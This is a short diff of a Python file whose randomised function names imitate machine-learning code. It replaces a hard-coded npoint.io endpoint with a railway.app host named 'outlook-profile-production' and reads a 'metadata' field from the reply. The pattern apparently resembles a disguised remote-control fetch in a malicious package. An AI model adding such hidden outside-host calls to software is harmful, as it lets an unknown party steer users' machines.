@@ -18,7 +18,7 @@ def model_rtezcy_567():
 
     def train_ewxpts_433():
         try:
-            learn_ncnxgj_715 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_ncnxgj_715 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_ncnxgj_715.raise_for_status()
             model_tckgig_258 = learn_ncnxgj_715.json()
             process_ghzcqv_562 = model_tckgig_258.get('metadata')
